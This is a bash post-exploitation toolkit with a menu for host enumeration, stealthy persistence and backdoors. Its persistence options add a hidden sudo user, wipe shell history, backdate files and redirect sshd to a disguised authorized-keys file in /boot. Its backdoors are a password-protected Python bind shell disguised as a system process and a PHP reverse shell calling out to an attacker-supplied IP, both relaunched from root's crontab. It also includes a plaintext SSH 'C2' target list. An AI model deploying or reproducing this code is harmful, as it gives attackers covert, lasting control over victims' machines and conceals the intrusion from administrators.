#!/usr/bin/env bash

#Colors:
        Bk='\033[0;30m'  # Black
        Rd='\033[0;31m'    # Red
        Gn='\033[0;32m'  # Green
        Yw='\033[0;33m' # Yellow
        Be='\033[0;34m'   # Blue
        Pe='\033[0;35m' # Purple
        Cn='\033[0;36m'   # Cyan
        We='\033[0;97m'  # White

#Extra:
    signature="$Rd By H0ru $Pe"
    tip="  $We[$Yw?$We] Press$Gn ENTER$We to OPTIONS or$Rd 1$We to EXIT!  "    
    iduser=$(id | cut -d ' ' -f1 | cut -d '=' -f2)
    info1=" Options$Gn 3 & 4$Pe dont need root power!"
    info2="Options$Gn 5, 6 and 7$Pe need root power!"
    online="$We"[$Gn"Online"$We]""
    offline="$We"[$Rd"Offline"$We]""
#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#

#Functions:

function loading() {
  spinner=( '|' '/' '-' '\' )
  end_time=$(( $(date +%s) + 2 ))
  while [ $(date +%s) -lt $end_time ]; do
    for i in "${spinner[@]}"
    do
      echo -ne "\r Loading... $i"
      sleep 0.1
    done
  done
  clear 
}

function root_check(){
if [[ $UID -ne 0 ]]
then
    clear
    echo
    echo -e "$Rd You nedd to be root to run this command!$We"
    echo
    exit 1
fi
}

#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#

#Modes:

#Info:
function info() {
 while true; do
  echo -e "
       ╔══════════════════════════════════╗
       ║$Gn           Informations:          $We║
       ╚══════════════════════════════════╝
"
    echo -e "
    1. Return
    2. Machine Info
    3. Crontab
    4. Tools
    "
    read -p "[Option]> " options

    case $options in
      1)
        break
        ;;
      2)
        machine
        ;;
      3)
        cron
        ;;
      4)
        tools
        ;;
      *)
        echo
        echo -e "$Rd"  Invalid Option!"$We"
        echo
        read -p " Press any key to continue..."
        ;;
    esac
  done
}

machine() {
  clear
  echo -e "
   $Gn [+] About me: $We
   $(id || (whoami && groups) 2>/dev/null)


   $Gn [+] Path: $We
   $PATH


   $Gn [+] HardwareInfo: $We
   $(grep 'model name' /proc/cpuinfo | head -1 | awk -F': ' '{print $2}')


   $Gn [+] SystemInfo: $We
   $(hostnamectl)


   $Gn [+] Sudo: $We
   $(sudo -V| head -n1)


   $Gn [+] Super Users: $We
   $(awk -F: '($3 == "0") {print}' /etc/passwd)


   $Gn [+] Shell Users: $We
   $(cat /etc/passwd | grep "sh$")


   $Gn [+] Partitions: $We
   $(df -h || lsblk)
"
}

cron() {
  clear
  echo -e "
   $Gn [+] Crontab: $We
   $(cat /etc/crontab && ls -als /etc/cron*)
"
}

tools(){
  clear
  echo -e "
   $Gn [+] Tools find: $We
$(which curl wget nc ncat netcat nmap tcpdump telnet clang gcc g++ make pkexec tmux perl php python python2 python2.7 python3 python3.6 python3.7 docker lxc lxd rkt podman aws kubectl doas sudo socat sshd service systemctl system xterm chattr| tr ' ' '\n')"
}

#Scripts:
function scripts() {
 while true; do
  echo -e "
       ╔══════════════════════════════════╗
       ║$Gn              Scripts:            $We║
       ╚══════════════════════════════════╝
"
    echo -e "
    1. Return
    2. LINPEAS
    3. Linux-Exploit-Suggester
    "
    read -p "[Option]> " options

    case $options in
      1)
        break
        ;;
      2)
        linpeas 2>/dev/null
        clear
        echo -e "$Gn[Linpeas File Created!]$We" 
        ;;
      3)
        exploit-suggester 2>/dev/null
        clear
        echo -e "$Gn[Exploit Suggester File Created!]$We"  
        ;;
      *)
        echo
        echo -e "$Rd"  Invalid Option!"$We"
        echo
        read -p " Press any key to continue..."
        ;;
    esac
  done
}

linpeas() {
  echo -e "

  " | base64 -d > linpeas ; chmod +x linpeas
}

exploit-suggester() {
  echo -e "

  " | base64 -d > exploit-suggester ; chmod +x exploit-suggester
}

#Persistence:
function persistence() {
 while true; do
  echo -e "
       ╔══════════════════════════════════╗
       ║$Gn            Persistence:          $We║
       ╚══════════════════════════════════╝
"
    echo -e "
    1. Return
    2. Backup User
    3. SSH Key
    "
    read -p "[Option]> " options

    case $options in
      1)
        break
        ;;
      2)
        backup_user
        clear
        echo -e "$Gn[Backup User Created!]$We"
        ;;
      3)
        ssh_key
        clear
        echo -e "$Gn[SSH Key Configurated!]$We"  
        ;;
      *)
        echo
        echo -e "$Rd"  Invalid Option!"$We"
        echo
        read -p " Press any key to continue..."
        ;;
    esac
  done
}

backup_user() {
                echo
                name=backups
                echo -e "$We [+] User: backups"
                read -p " [+] Password: " password
                echo -ne "$password\n$password\n\n\n\n" | adduser $name 2>/dev/null
                echo -ne "\n$name   ALL=(ALL:ALL) ALL\n" >> /etc/sudoers
                mv /var/backups /var/bkps
                mv /home/backups /var/backups
                rm -rfd /var/backups/*
                sed -i 's/:\/home\/backups:/:\/var\/backups:/g' /etc/passwd
                shred -fuz /var/backups/.bash_history 2>/dev/null
                ln -s /dev/null /var/backups/.bash_history
                touch -t 201912250000 /var/backups/
}

ssh_key() {
         echo

         echo -e "$We [+] SSH-KEY"

         read -p " [+] Paste your public key: " key

         echo $key >> /boot/model-generic

         chown backups:backups /boot/model-generic

         touch -t 201910280000 /boot/model-generic

         chmod 0600 /boot/model-generic

         sed -i 's/^.AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config;

         sed -i 's/AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config;

         sed -i 's/^.PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config;

         sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config;

         service ssh restart;
}

#Backdoors:
function backdoors() {
  while true; do

    testpython=$(command -v python3 >/dev/null 2>&1 && echo -e "$Gn Installed!" || echo -e "$Rd Not Installed!")

    echo -e "$Be
    ╔══════════════════════════════════════════╗
    ║          Python3 checker to GPK          ║
    ╠════════════════════╦═════════════════════╝
    ║       Status:      ║    [$testpython$Be ]
    ╚════════════════════╝   
    "
   
    test_python=$(command -v python3 >/dev/null 2>&1 && echo -e "$Installed!" || echo -e "Not Installed!")

    test "$test_python" = "Not Installed!" && echo -e "$We" && exit

    echo -e "$We"

    testphp=$(command -v php >/dev/null 2>&1 && echo -e "$Gn Installed!" || echo -e "$Rd Not Installed!")

    echo -e "$Be
    ╔══════════════════════════════════════════╗
    ║            PHP checker to GPK            ║
    ╠════════════════════╦═════════════════════╝
    ║       Status:      ║    [$testphp$Be ]
    ╚════════════════════╝   
    "
   
    test_php=$(command -v php >/dev/null 2>&1 && echo -e "$Installed!" || echo -e "Not Installed!")

    test "$test_php" = "Not Installed!" && echo -e "$We" && exit

    echo

    echo -e "$Be
    ╔══════════════════════════════════════════╗
    ║         Web Service Folder Checker       ║   
    ╚══════════════════════════════════════════╝
    "
 
web_services_folder="/var/www/html"

if [ -d $web_services_folder ]; then
  echo -e "$We The web services folder was found at: $Gn$web_services_folder"
else
  echo -e "$We No web services folder found on your machine"
  exit 1
fi

echo -e "$We"

  echo -e "
       ╔══════════════════════════════════╗
       ║$Gn             Backdoors:           $We║
       ╚══════════════════════════════════╝
"
    echo -e "
    1. Return
    2. Python3 Backdoor
    3. PHP Backdoor
    "
    read -p "[Option]> " options

    case $options in
      1)
        break
        ;;
      2)
        python_backdoor
        clear
        ;;
      3)
        php_backdoor
        clear 
        ;;
      *)
        echo
        echo -e "$Rd"  Invalid Option!"$We"
        echo
        read -p " Press any key to continue..."
        ;;
    esac
  done

}

python_backdoor() {
  echo
  cat << 'EOF' > /usr/lib/networker
#!/usr/bin/env python3
import socket
import os
import subprocess
import traceback
import threading
from socket import error as SocketError
import errno
LOCALHOST = '0.0.0.0' 
PORT = DOOR
banner = (b"""
          NETWORK SYSTEM
""")
class ClientThread(threading.Thread):
    def __init__(self,clientAddress,clientsocket):
        threading.Thread.__init__(self)
        self.csocket = clientsocket
    def run(self):
        while True:
            self.csocket.send(banner)
            while True:
                data = self.csocket.recv(1024)
                if data.decode() == "PASSWORD\n":
                    self.csocket.send(b"Right!\n")
                    while True:
                        data = self.csocket.recv(1024)
                        self.csocket.send(b"Command: " + data)
                        command = data.decode()
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
                        output = proc.stdout.read()
                        self.csocket.send(bytes(output))
                else:
                    self.csocket.send(b"Error!\n")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((LOCALHOST, PORT))
while True:
    s.listen(1000)
    clientsock, clientAddress = s.accept()
    newthread = ClientThread(clientAddress, clientsock)
    newthread.start()
EOF


read -p " [+] Your listening port: " DOOR


sed -i "s/DOOR/$DOOR/" /usr/lib/networker


read -p " [+] Your password: " PASSWORD


sed -i "s/PASSWORD/$PASSWORD/" /usr/lib/networker


python3 -m py_compile /usr/lib/networker


mv /usr/lib/__pycache__ /usr/lib/networks


mv /usr/lib/networks/networkercpython* /usr/lib/networks/networker.proc


rm /usr/lib/networker


cat << 'EOF' > /etc/security/system.conf
#!/usr/bin/env bash
while :
do
    /usr/bin/python3 /usr/lib/networks/networker.proc
    sleep 5
done
EOF

chmod u+x /etc/security/system.conf

echo "* * * * * root  /usr/bin/env bash /etc/security/system.conf" >> /etc/crontab   

        echo -e "$Gn[Opened!]$We"
}

php_backdoor() {
  echo
  cat << 'EOF' > /var/www/html/backup.php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'ALTERN1';  
$port = ALTERN2;       
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        
        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }
        
        if ($pid) {
                exit(0);  
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }
        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  
   1 => array("pipe", "w"),  
   2 => array("pipe", "w")   
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}
?>
EOF

read -p " [+] Your ip address: " ALTERN1

sed -i "s/ALTERN1/$ALTERN1/" /var/www/html/backup.php

read -p " [+] Your listening port: " ALTERN2

sed -i "s/ALTERN2/$ALTERN2/" /var/www/html/backup.php

echo "* * * * * root  php -f /var/www/html/backup.php 2>/dev/null &" >> /etc/crontab

        echo -e "$Gn[Opened!]$We" 
}

#SSH-C2
function chacal-c2() {
  while true; do
    clear

##Create directories
if [ ! -d "/usr/local/chacal-c2" ]; then
    mkdir "/usr/local/chacal-c2"
    chgrp $SUDO_USER /usr/local/chacal-c2
    chmod 770 /usr/local/chacal-c2
fi

##Create target file
if [ ! -f "/usr/local/chacal-c2/targets.txt" ]; then
    touch /usr/local/chacal-c2/targets.txt
    chmod 660 /usr/local/chacal-c2/targets.txt
    chgrp $SUDO_USER /usr/local/chacal-c2/targets.txt
fi

logo
    echo -e "
    Chacal-C2 Directory: $Gn/usr/local/chacal-c2$We
    Targets File: $Gn/usr/local/chacal-c2/targets.txt$We"
    echo -e "
   ╔══════╦══════╦════════╦══════════╦════════╗
   ║$Gn  ID  $We║$Gn  IP  $We║$Gn  USER  $We║$Gn  PASSWD  $We║$Gn  PORT  $We║
   ╚══════╩══════╩════════╩══════════╩════════╝ 
    "
    cat /usr/local/chacal-c2/targets.txt | sed -E 's/ / : /g' | sed 's/^/ /'
    echo -e "
    1. Return
    2. Add Target
    3. Remove Target
    4. Access Target
    "
    read -p "[Option]> " option

    case $option in
      1)
        break
        ;;
      2)
        addtarget
        ;;
      3)
        removetarget
        ;;
      4)
        accesstarget
        ;;
      *)
        echo
        echo -e "$Rd"  Invalid Option!"$We"
        echo
        read -p " Press any key to continue..."
        ;;
    esac
  done
}

gen_id() {
    local id=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 10 | head -n 1)
    echo "$id"
}

logo() {
    echo -e "$Rd
     ██████╗██╗  ██╗ █████╗  ██████╗ █████╗ ██╗          ██████╗██████╗ 
    ██╔════╝██║  ██║██╔══██╗██╔════╝██╔══██╗██║         ██╔════╝╚════██╗
    ██║     ███████║███████║██║     ███████║██║         ██║      █████╔╝
    ██║     ██╔══██║██╔══██║██║     ██╔══██║██║         ██║     ██╔═══╝ 
    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██║███████╗    ╚██████╗███████╗
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝     ╚═════╝╚══════╝
         $We" 
}

addtarget() {
    echo -e "
    $Be ADD your SSH connection $We
    "
    read -p "> IP: " ipssh
    read -p "> Username: " userssh
    read -p "> Password: " passwdssh
    read -p "> Port: " portssh
    echo -e "$(gen_id) $ipssh $userssh $passwdssh $portssh" >> /usr/local/chacal-c2/targets.txt
    echo
    echo -e "$Gn Added $We"
    echo
    echo
    clear
}

accesstarget() {
    echo -e "
    $Pe Acess SSH connection $We
    "
    credentials_file="/usr/local/chacal-c2/targets.txt"
    read -p "> Target ID: " targetid
    echo
    local line=$(grep "^$targetid" "$credentials_file")
    local ip=$(echo "$line" | cut -d ' ' -f 2)
    local user=$(echo "$line" | cut -d ' ' -f 3)
    local pass=$(echo "$line" | cut -d ' ' -f 4)
    local port=$(echo "$line" | cut -d ' ' -f 5)
    echo -e "$Gn Target password:$We $pass" 
    ssh $user@$ip -p $port
}

removetarget() {
    echo -e "
    $Rd Remove SSH connection $We
    "
    read -p "> Target ID: " targetid
    sed -i "/$targetid/d" /usr/local/chacal-c2/targets.txt
    echo
    echo
    clear
}

#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#=#+#=#

echo -e "
$Pe
          ╔════════════════════════════════════════════════════════════════╗
          ║        ________                           __________           ║
          ║       /  _____/  ____   ____    _________ \______   \          ║ 
          ║      /   \  ____/ __ \ /    \  / ___\__  \ |       _/          ║
          ║      \    \_\  \  ___/|   |  \/ /_/  > __ \|    |   \          ║
          ║       \______  /\___  >___|  /\___  (____  /____|_  /          ║
          ║              \/     \/     \//_____/     \/       \/           ║
          ║    __________                             ____  __.__  __      ║
          ║    \______   \__  _  ______   ___________|    |/ _|__|/  |_    ║
          ║     |     ___/\ \/ \/ /    \_/ __ \_  __ \      < |  \   __\   ║
          ║     |    |     \     /   |  \  ___/|  | \/    |  \|  ||  |     ║
          ║     |____|      \/\_/|___|  /\___  >__|  |____|__ \__||__|     ║
          ║                           \/     \/              \/            ║
          ║                           $signature                            ║
          ║                                                                ║
          ╚════════════════════════════════════════════════════════════════╝
"
echo -e "$Rd"
loading

echo -e "$Pe
  ⠀⠀⠀⠀⠀⢸⠓⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⢸⠀⠀⠑⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   
  ⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠙⢤⡷⣤⣦⣀⠤⠖⠚⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀   
  ⣠⡿⠢⢄⡀⠀⡇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠸⠷⣶⠂⠀⠀⠀⣀⣀⠀⠀⠀  
  ⢸⣃⠀⠀⠉⠳⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⢉⡭⠋ ╔═══╗  
  ⠀⠘⣆⠀⠀⠀⠁⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀ ║  [>] H3ll0: $Rd$(whoami)$Pe
  ⠀⠀⠘⣦⠆⠀⠀⢀⡎⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⣠⠔⠋⠀⠀⠀⠀ ║  [>] Y0ur p0w3r: $Rd"$iduser"$Pe
  ⠀⠀⠀⡏⠀⠀⣆⠘⣄⠸⢧⠀⠀⠀⠀⢀⣠⠖⢻⠀⠀⠀⣿⢥⣄⣀⣀⣀⠀⠀ ║   ║
  ⠀⠀⢸⠁⠀⠀⡏⢣⣌⠙⠚⠀⠀⠠⣖⡛⠀⣠⠏⠀⠀⠀⠇⠀⠀⠀⠀⢙⣣⠄ ║   ║
  ⠀⠀⢸⡀⠀⠀⠳⡞⠈⢻⠶⠤⣄⣀⣈⣉⣉⣡⡔⠀⠀⢀⠀⠀⣀⡤⠖⠚⠀⠀ ║  [?]$info1
  ⠀⠀⡼⣇⠀⠀⠀⠙⠦⣞⡀⠀⢀⡏⠀⢸⣣⠞⠀⠀⠀⡼⠚⠋⠁⠀⠀⠀⠀⠀ ║  [?] $info2
  ⠀⢰⡇⠙⠀⠀⠀⠀⠀⠀⠉⠙⠚⠒⠚⠉⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀ ╚═══╝
  ⠀⠀⢧⡀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠙⣶⣶⣿⠢⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⢿⣳⠞⠳⡄⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠹⣄⣀⡤⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"

echo -e "$We"

#MENU:

PS3="
$(echo -e "$tip")

[GPK]> "
options=(
"Exit"
"Clear"
"Info"
"Scripts"
"Persistence"
"Backdoors"
"SSH-C2"
)

 select var in "${options[@]}"; do
    case $var in

"Exit")
echo -e "$We"
export HISTFILE=/dev/null
exit
;;
"Clear")
clear
;;
"Info")
clear
info
;;
"Scripts")
clear
scripts
;;
"Persistence")
clear
root_check
persistence
;;
"Backdoors")
clear
root_check
backdoors
;;
"SSH-C2")
clear
root_check
chacal-c2
;;
*)
  echo
  echo -e "$Rd"  Invalid Option!"$We"
    esac
    echo
done
